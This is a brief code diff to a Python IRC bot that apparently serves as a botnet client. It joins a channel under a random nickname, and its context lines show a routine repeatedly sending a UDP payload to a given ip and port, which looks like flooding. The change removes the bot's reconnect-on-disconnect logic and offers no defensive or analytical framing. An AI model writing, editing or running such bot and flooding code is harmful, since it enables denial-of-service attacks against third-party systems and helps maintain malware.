@@ -10,8 +10,6 @@ class SimpleBot(irc.bot.SingleServerIRCBot):
         nickname = self.generate_random_nickname()
         super().__init__([(server, port)], nickname, nickname)
         self.channel = channel
-        self.max_retries = 3
-        self.retry_delay = 5
 
     def generate_random_nickname(self):
         return ''.join(random.choices(string.ascii_letters + string.digits, k=8))
@@ -65,14 +63,6 @@ class SimpleBot(irc.bot.SingleServerIRCBot):
             s.sendto(payload, (ip, port))
             s.sendto(payload, (ip, port))
             s.close()
-
-    def on_disconnect(self, connection, event):
-        if self.max_retries > 0:
-            self.max_retries -= 1
-            time.sleep(self.retry_delay)
-            self.connect(self.server, self.port)
-        else:
-            print("Failed to connect to IRC server after multiple retries. Giving up.")
 
 if __name__ == "__main__":
     CHANNEL = "#anontoken"
